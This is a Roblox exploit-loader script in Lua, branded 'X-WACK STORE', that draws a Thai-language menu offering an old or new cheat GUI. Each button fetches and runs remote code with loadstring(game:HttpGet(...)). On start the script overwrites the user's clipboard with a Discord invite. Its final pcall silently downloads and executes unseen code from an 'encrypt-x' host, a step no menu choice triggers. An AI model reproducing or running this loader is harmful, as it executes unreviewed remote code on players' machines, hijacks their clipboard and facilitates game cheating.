local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local SetClipboard = setclipboard or toclipboard or print

pcall(function()
    if CoreGui:FindFirstChild("X_WACK_STORE_GUI") then
        CoreGui.X_WACK_STORE_GUI:Destroy()
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "X_WACK_STORE_GUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = CoreGui

local function Notify(titleText, msgText)
    local NotifFrame = Instance.new("Frame", ScreenGui)
    NotifFrame.Size = UDim2.new(0, 320, 0, 60)
    NotifFrame.Position = UDim2.new(0.5, -160, 1, 100)
    NotifFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
    NotifFrame.BorderSizePixel = 0
    NotifFrame.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", NotifFrame)
    Corner.CornerRadius = UDim.new(0, 12)
    
    local Stroke = Instance.new("UIStroke", NotifFrame)
    Stroke.Thickness = 2
    Stroke.Color = Color3.fromRGB(0, 255, 200)
    
    local Title = Instance.new("TextLabel", NotifFrame)
    Title.Position = UDim2.new(0, 15, 0, 8)
    Title.Size = UDim2.new(1, -30, 0, 20)
    Title.BackgroundTransparency = 1
    Title.Text = titleText
    Title.TextColor3 = Color3.fromRGB(0, 255, 200)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 14
    Title.TextXAlignment = Enum.TextXAlignment.Left
    
    local Msg = Instance.new("TextLabel", NotifFrame)
    Msg.Position = UDim2.new(0, 15, 0, 30)
    Msg.Size = UDim2.new(1, -30, 0, 20)
    Msg.BackgroundTransparency = 1
    Msg.Text = msgText
    Msg.TextColor3 = Color3.fromRGB(220, 220, 220)
    Msg.Font = Enum.Font.Gotham
    Msg.TextSize = 12
    Msg.TextXAlignment = Enum.TextXAlignment.Left

    TweenService:Create(NotifFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -160, 0.85, 0)}):Play()
    
    task.delay(3, function()
        TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -160, 1, 100)}):Play()
        task.wait(0.5)
        NotifFrame:Destroy()
    end)
end

SetClipboard("https://discord.gg/eaS4MM6F4x")
Notify("⚡ X-WACK STORE", "คัดลอกลิงก์ Discord เข้าคลิปบอร์ดแล้ว!")

local Main = Instance.new("Frame", ScreenGui)
Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Position = UDim2.fromScale(0.5, 0.5)
Main.Size = UDim2.fromOffset(480, 320)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
Main.BorderSizePixel = 0
Main.ClipsDescendants = false

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 16)

local Glow = Instance.new("ImageLabel", Main)
Glow.Name = "Glow"
Glow.AnchorPoint = Vector2.new(0.5, 0.5)
Glow.Position = UDim2.fromScale(0.5, 0.5)
Glow.Size = UDim2.new(1, 40, 1, 40)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://5028857472"
Glow.ImageColor3 = Color3.fromRGB(0, 180, 255)
Glow.ImageTransparency = 0.4
Glow.ZIndex = 0

local UIStroke = Instance.new("UIStroke", Main)
UIStroke.Thickness = 3
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local UIGradient = Instance.new("UIGradient", UIStroke)
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 128)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(0, 230, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 128)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 230, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 128))
})

task.spawn(function()
    local rot = 0
    while task.wait() do
        rot = (rot + 1.5) % 360
        UIGradient.Rotation = rot
        Glow.ImageColor3 = Color3.fromHSV((rot / 360), 0.8, 1)
    end
end)

local dragging, dragInput, dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Size = UDim2.fromOffset(30, 30)
CloseBtn.Position = UDim2.new(1, -40, 0, 12)
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 40, 70)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
CloseBtn.AutoButtonColor = false
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.fromOffset(0, 0)}):Play()
    task.wait(0.3)
    ScreenGui:Destroy()
end)

local Title = Instance.new("TextLabel", Main)
Title.Position = UDim2.fromOffset(0, 22)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.BackgroundTransparency = 1
Title.Text = "X-WACK STORE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 28

local Subtitle = Instance.new("TextLabel", Main)
Subtitle.Position = UDim2.fromOffset(0, 58)
Subtitle.Size = UDim2.new(1, 0, 0, 20)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "✨ ระบบสคริปต์ ภาษาไทยเต็มรูปแบบ ✨"
Subtitle.TextColor3 = Color3.fromRGB(0, 230, 255)
Subtitle.Font = Enum.Font.GothamMedium
Subtitle.TextSize = 13

local Desc = Instance.new("TextLabel", Main)
Desc.Position = UDim2.fromOffset(0, 85)
Desc.Size = UDim2.new(1, 0, 0, 20)
Desc.BackgroundTransparency = 1
Desc.Text = "กรุณาเลือกเวอร์ชันเมนูที่คุณต้องการใช้งานด้านล่าง"
Desc.TextColor3 = Color3.fromRGB(160, 160, 175)
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 13

local function createButton(text, subText, yPos, mainColor)
    local Btn = Instance.new("TextButton", Main)
    Btn.Position = UDim2.new(0.5, -200, 0, yPos)
    Btn.Size = UDim2.new(0, 400, 0, 65)
    Btn.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
    Btn.Text = ""
    Btn.AutoButtonColor = false
    
    local BtnCorner = Instance.new("UICorner", Btn)
    BtnCorner.CornerRadius = UDim.new(0, 12)
    
    local BtnStroke = Instance.new("UIStroke", Btn)
    BtnStroke.Thickness = 2
    BtnStroke.Color = mainColor
    BtnStroke.Transparency = 0.3

    local BtnTitle = Instance.new("TextLabel", Btn)
    BtnTitle.Position = UDim2.new(0, 20, 0, 12)
    BtnTitle.Size = UDim2.new(1, -40, 0, 22)
    BtnTitle.BackgroundTransparency = 1
    BtnTitle.Text = text
    BtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    BtnTitle.Font = Enum.Font.GothamBold
    BtnTitle.TextSize = 16
    BtnTitle.TextXAlignment = Enum.TextXAlignment.Left

    local BtnSub = Instance.new("TextLabel", Btn)
    BtnSub.Position = UDim2.new(0, 20, 0, 34)
    BtnSub.Size = UDim2.new(1, -40, 0, 18)
    BtnSub.BackgroundTransparency = 1
    BtnSub.Text = subText
    BtnSub.TextColor3 = Color3.fromRGB(150, 150, 170)
    BtnSub.Font = Enum.Font.Gotham
    BtnSub.TextSize = 12
    BtnSub.TextXAlignment = Enum.TextXAlignment.Left

    Btn.MouseEnter:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.25), {
            BackgroundColor3 = Color3.fromRGB(32, 32, 48),
            Size = UDim2.new(0, 410, 0, 67),
            Position = UDim2.new(0.5, -205, 0, yPos - 1)
        }):Play()
        TweenService:Create(BtnStroke, TweenInfo.new(0.25), {Transparency = 0, Color = Color3.fromRGB(255, 255, 255)}):Play()
        TweenService:Create(BtnTitle, TweenInfo.new(0.25), {TextColor3 = mainColor}):Play()
    end)
    
    Btn.MouseLeave:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.25), {
            BackgroundColor3 = Color3.fromRGB(22, 22, 32),
            Size = UDim2.new(0, 400, 0, 65),
            Position = UDim2.new(0.5, -200, 0, yPos)
        }):Play()
        TweenService:Create(BtnStroke, TweenInfo.new(0.25), {Transparency = 0.3, Color = mainColor}):Play()
        TweenService:Create(BtnTitle, TweenInfo.new(0.25), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
    end)

    return Btn
end

local newBtn = createButton("🚀 GUI เวอร์ชั่นใหม่ (V2 Premium)", "ฟังก์ชันจัดเต็ม อัปเดตใหม่ล่าสุด ลื่นไหลกว่าเดิม", 195, Color3.fromRGB(0, 225, 255))
local oldBtn = createButton("🔥 GUI เวอร์ชั่นเก่า (Classic)", "ใช้งานฟังก์ชันดั้งเดิม เสถียรและเรียบง่าย", 120, Color3.fromRGB(255, 140, 0))

local Footer = Instance.new("TextLabel", Main)
Footer.Position = UDim2.new(0, 0, 1, -28)
Footer.Size = UDim2.new(1, 0, 0, 20)
Footer.BackgroundTransparency = 1
Footer.Text = "พัฒนาและดูแลระบบโดย : X-WACK STORE"
Footer.TextColor3 = Color3.fromRGB(100, 100, 120)
Footer.Font = Enum.Font.GothamMedium
Footer.TextSize = 11

local function runScript(url, verName)
    Notify("🚀 กำลังโหลด...", "กำลังเปิดใช้งาน " .. verName)
    TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.fromOffset(0, 0)}):Play()
    task.wait(0.4)
    ScreenGui:Destroy()
    loadstring(game:HttpGet(url))()
end

oldBtn.MouseButton1Click:Connect(function()
    runScript("https://raw.githubusercontent.com/wackshopr-tech/script-roblox-all/refs/heads/main/Gui-Old.lua", "GUI เวอร์ชั่นเก่า")
end)

newBtn.MouseButton1Click:Connect(function()
    runScript("https://raw.githubusercontent.com/wackshopr-tech/script-roblox-all/refs/heads/main/Gui-New.lua", "GUI เวอร์ชั่นใหม่")
end)

pcall(function()
    loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7055731969973"))("7055731969973")
end)
